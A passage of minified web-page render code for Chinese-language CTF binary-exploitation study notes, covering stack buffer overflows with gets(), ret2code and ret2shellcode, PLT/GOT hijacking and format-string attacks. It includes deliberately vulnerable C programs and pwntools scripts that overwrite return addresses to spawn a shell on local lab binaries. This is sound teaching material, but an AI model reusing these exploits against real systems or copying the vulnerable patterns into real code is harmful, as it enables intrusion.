punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("gets")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buffer"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("a"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("system")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/bin/sh"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br")])]),n("p",[n("img",{attrs:{src:a(587),alt:""}}),t._v(" "),n("img",{attrs:{src:a(588),alt:""}})]),t._v(" "),n("h4",{attrs:{id:"如何算offset"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#如何算offset"}},[t._v("#")]),t._v(" 如何算offset")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("先随意输入来确定buffer位置")])]),t._v(" "),n("li",[n("p",[t._v("计算buffer位置和目标位置距离多远")])])]),t._v(" "),n("p",[n("img",{attrs:{src:a(589),alt:""}})]),t._v(" "),n("p",[t._v("使用radare2")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("r2 ./bof1\nafl 分析函数\ns main 查看main函数\nVV 进入视图模式\n")])])]),n("h4",{attrs:{id:"使用gdb配合脚本调试-gdbscript"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#使用gdb配合脚本调试-gdbscript"}},[t._v("#")]),t._v(" 使用gdb配合脚本调试, gdbscript")]),t._v(" "),n("p",[t._v("方法1")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" pwn "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\nr "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" process"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'./bof1'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("raw_input")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 这里断下，执行脚本后看pid是多少比如6113")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 新建窗口终端")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# $gdb")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# gdb$ attach 6113")]),t._v("\ns "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" r"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recvuntil"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'What\\'s the secret ?'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'recvuntil'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" s"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("flat"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'AAAAAAAA'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0xbeef")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0xdead")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("interactive"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br")])]),n("p",[t._v("方法2")]),t._v(" "),n("p",[n("a",{attrs:{href:"scripts/pwn_000_01_gdbattach.py"}},[t._v("pwn_000_01_gdbattach")])]),t._v(" "),n("h5",{attrs:{id:"kali不能执行gdb-script的bug"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#kali不能执行gdb-script的bug"}},[t._v("#")]),t._v(" kali不能执行gdb script的bug")]),t._v(" "),n("p",[t._v("https://juejin.im/post/5e68ff69518825494466bc57")]),t._v(" "),n("p",[t._v("方法1:")]),t._v(" "),n("p",[t._v("sudo update-alternatives --config x-terminal-emulator")]),t._v(" "),n("p",[t._v("可用 lxterm, uxterm, xterm")]),t._v(" "),n("p",[n("a",{attrs:{href:"https://www.cnblogs.com/wgf4242/p/13232979.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("方法2"),n("OutboundLink")],1)]),t._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v("vi /home/kali/.local/lib/python3.8/site-packages/pwnlib/util/misc.py\n# 在Launching a new terminal 这一行后面添加\nargv = argv[:-1] + [x.strip('\"') for x in argv[-1].split()]\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br")])]),n("h3",{attrs:{id:"bof"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#bof"}},[t._v("#")]),t._v(" bof")]),t._v(" "),n("h4",{attrs:{id:"bof-ret2code"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#bof-ret2code"}},[t._v("#")]),t._v(" bof-ret2code")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("透过Buffer Overflow 改赞 return address")])]),t._v(" "),n("li",[n("p",[t._v("将return address改到code中任意处")])]),t._v(" "),n("li",[n("p",[t._v("须关闭 PIE")])])]),t._v(" "),n("div",{staticClass:"language-c line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[n("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("# "),n("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("# "),n("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdlib.h>")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("void")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("shell")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("system")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/bin/sh"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buffer"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("gets")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buffer"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br")])]),n("p",[n("img",{attrs:{src:a(590),alt:""}})]),t._v(" "),n("h5",{attrs:{id:"如何找到address-如何查找函数"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#如何找到address-如何查找函数"}},[t._v("#")]),t._v(" 如何找到address? 如何查找函数")]),t._v(" "),n("p",[t._v("三种方式")]),t._v(" "),n("div",{staticClass:"language-sh line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-sh"}},[n("code",[t._v("sh$ objdump -M intel -d filename "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("less")]),t._v("\nsh$ objdump -d filename\nsh$ objdump -d -j .plt ./ret2libc3 "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("grep")]),t._v(" system     //查找system的plt地址\nsh$ ROPgadget --binary ./ret2libc3 --string "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/bin/sh"')]),t._v("       // 查找bin_sh字符串地址\ngdb-peda$ p shell\nr2$ afl~shell\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br")])]),n("p",[t._v("反汇编语法设置默认为AT&T改为Intel语法： 相当于-M")]),t._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v("set disassembly-flavor intel>~/.gdbinit\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("p",[t._v("retn 返回stack栈顶的地址")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" pwn "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\nr "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" process"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'./bof'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\noffset "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x7fffffffe718")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x7fffffffe700")]),t._v("\nhidden "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x00400566")]),t._v("\n\nr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'a'")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("offset "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" p64"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("hidden"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\nr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("interactive"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br")])]),n("p",[t._v("进入gets前，和gets的retn对应offset\n"),n("img",{attrs:{src:a(591),alt:""}})]),t._v(" "),n("p",[t._v("retn")]),t._v(" "),n("p",[n("img",{attrs:{src:a(592),alt:""}})]),t._v(" "),n("h4",{attrs:{id:"bof-ret2shellcode"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#bof-ret2shellcode"}},[t._v("#")]),t._v(" bof - ret2shellcode")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("透过Buffer Overflow 改赞 return address")])]),t._v(" "),n("li",[n("p",[t._v("将return address改到自己写的shell code处并执行")])]),t._v(" "),n("li",[n("p",[t._v("须关闭 NX (NX限制执行权限)")])]),t._v(" "),n("li",[n("p",[t._v("需要关闭ASLR(地址空间布局随机变化保护)")])])]),t._v(" "),n("p",[t._v("vmap查看, 开启NX导致w,x不会同时开启。")]),t._v(" "),n("p",[n("img",{attrs:{src:a(593),alt:""}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(594),alt:""}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(595),alt:""}})]),t._v(" "),n("p",[t._v("可参见 LINUX SYSTEM CALL TABLE FOR X86 64")]),t._v(" "),n("p",[t._v("exp见 "),n("a",{attrs:{href:"scripts/pwn_01_01ret2shellcode2.py"}},[t._v("pwn_01_01ret2shellcode2")])]),t._v(" "),n("p",[n("a",{attrs:{href:"https://defuse.ca/online-x86-assembler.htm#disassembly",target:"_blank",rel:"noopener noreferrer"}},[t._v("在线转换"),n("OutboundLink")],1)]),t._v(" "),n("h5",{attrs:{id:"哪里可以写shellcode"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#哪里可以写shellcode"}},[t._v("#")]),t._v(" 哪里可以写shellcode?")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("选择含有rwx处")])]),t._v(" "),n("li",[n("p",[t._v("选择中间部分，因为前後可能会有用到")])])]),t._v(" "),n("p",[n("img",{attrs:{src:a(596),alt:""}})]),t._v(" "),n("h3",{attrs:{id:"libc"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#libc"}},[t._v("#")]),t._v(" Libc")]),t._v(" "),n("h5",{attrs:{id:"lazy-binding"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#lazy-binding"}},[t._v("#")]),t._v(" Lazy binding")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("Dynamic linking的程式在执行过程中，有些library中的函式可能到结束都不轨行到")])]),t._v(" "),n("li",[n("p",[t._v("ELF采取Lazy binding的机制，在第一次call function時，才会去找真正的位置进行binding")])])]),t._v(" "),n("h5",{attrs:{id:"plt-got"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#plt-got"}},[t._v("#")]),t._v(" plt&got")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("因为Lazy binding的榄制，常要用到library函数时，会call目模函数的plt，接著才call目模函数的 got")])]),t._v(" "),n("li",[n("p",[t._v("got 中存有目模函数在library中真正的位置")])])]),t._v(" "),n("p",[t._v("如果可执行文件中调用多个动态库函数，那每个函类都需要这两样东西，这样每样东西就形成一个表，每个函数使用中的一项。")]),t._v(" "),n("p",[t._v("总不能每次都叫这个表那个表，于是得正名。存放函数地址的数据表，称为全局偏移表或者全局函数表")]),t._v(" "),n("p",[t._v("GOT: Global Offset Table -- 全局偏移表或者全局函数表")]),t._v(" "),n("p",[t._v("PLT: Procedure Link Table -- 内部函数表. 指那个额外代码段表，称为程序链接表")]),t._v(" "),n("p",[n("img",{attrs:{src:a(597),alt:""}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(598),alt:""}})]),t._v(" "),n("p",[n("strong",[t._v("延迟绑定 Lazy binding")])]),t._v(" "),n("p",[t._v("函数第一次使用是地才进行绑定。")]),t._v(" "),n("p",[t._v("ELF实现延迟是通过PLT。原先GOT中存放着全局变量和函数调用。现在拆分.got和 .got.plt。")]),t._v(" "),n("p",[t._v(".got存放着全局变量引用，")]),t._v(" "),n("p",[t._v(".got.plt 存放着函数引用。")]),t._v(" "),n("p",[t._v("查看"),n("code",[t._v("test@plt")]),t._v("用"),n("code",[t._v("objdump -Mintel -d -j .plt got")])]),t._v(" "),n("p",[t._v("-j 指定节。\n-j .plt 查找符号表")]),t._v(" "),n("h5",{attrs:{id:"got-hijacking"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#got-hijacking"}},[t._v("#")]),t._v(" GOT Hijacking")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("透过改写GOT使得呼叫函数式，跳到指定位置")])]),t._v(" "),n("li",[n("p",[t._v("不能是Full RELRO")])])]),t._v(" "),n("p",[n("img",{attrs:{src:a(599),alt:""}}),t._v(" "),n("img",{attrs:{src:a(600),alt:""}}),t._v(" "),n("img",{attrs:{src:a(601),alt:""}}),t._v(" "),n("img",{attrs:{src:a(602),alt:""}})]),t._v(" "),n("p",[t._v("source: "),n("a",{attrs:{href:"practise/pwn_04_gothijack.c"}},[t._v("pwn_gothijack")])]),t._v(" "),n("p",[t._v("exp "),n("RouterLink",{attrs:{to:"/ctf/practise/writeup.html"}},[t._v("pwn_gothijack")])],1),t._v(" "),n("h3",{attrs:{id:"fmt"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#fmt"}},[t._v("#")]),t._v(" fmt")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("Format string attack")])]),t._v(" "),n("li",[n("p",[t._v("Read - information leak:")]),t._v(" "),n("ul",[n("li",[t._v("PIE, stack heap libc ASLR, cannary")])])]),t._v(" "),n("li",[n("p",[t._v("Write - almost write every where")])]),t._v(" "),n("li",[n("p",[t._v("Powerful vulnerablility")])])]),t._v(" "),n("p",[t._v("往后进行 overflow, 覆盖到 rbp")]),t._v(" "),n("div",{staticClass:"language-c line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" format"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("fprintf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" FILE"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" stream"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" format"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("vprintf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" format"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" va_list arg"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("vfprintf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" format"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" va_list arg"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("vprintf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" format"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" va_list arg"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("vprintf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" FILE "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("stream"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" format"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" va_list arg"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("vdprintf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" fd"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" format"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" va_list ap"),n("span",{pre:!0,attrs:{class:"token 